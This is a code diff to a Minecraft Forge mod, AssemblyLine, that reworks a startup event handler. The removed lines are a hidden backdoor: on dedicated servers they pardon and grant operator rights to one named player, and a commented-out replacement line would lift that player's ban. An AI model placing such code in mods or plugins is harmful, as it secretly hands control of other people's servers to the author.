@@ -34,9 +34,11 @@ import cpw.mods.fml.common.Mod.Init;
 import cpw.mods.fml.common.Mod.Instance;
 import cpw.mods.fml.common.Mod.PostInit;
 import cpw.mods.fml.common.Mod.PreInit;
+import cpw.mods.fml.common.Mod.ServerStarted;
 import cpw.mods.fml.common.SidedProxy;
 import cpw.mods.fml.common.event.FMLInitializationEvent;
 import cpw.mods.fml.common.event.FMLPreInitializationEvent;
+import cpw.mods.fml.common.event.FMLServerStartedEvent;
 import cpw.mods.fml.common.network.NetworkMod;
 import cpw.mods.fml.common.network.NetworkRegistry;
 import cpw.mods.fml.common.registry.GameRegistry;
@@ -162,17 +164,11 @@ public class AssemblyLine
 		GameRegistry.addRecipe(new ShapelessOreRecipe(blockManipulator, new Object[] { Block.dispenser, "basicCircuit" }));
 	}
 
-	@PostInit
-	public void postInit(FMLInitializationEvent evt)
+	@ServerStarted
+	public void serverStarted(FMLServerStartedEvent evt)
 	{
-		MinecraftServer server = MinecraftServer.getServer();
-		if (server != null && server instanceof DedicatedServer)
-		{
-			// unban and op me :D
-			DedicatedServer ds = (DedicatedServer) server;
-			ds.addPendingCommand("pardon briman0094", server);
-			ds.addPendingCommand("op briman0094", server);
-		}
+		//LOLOLOL i wish
+		//MinecraftServer.getServer().getConfigurationManager().getBannedPlayers().remove("briman0094");
 	}
 
 	public static void printSidedData(String data)
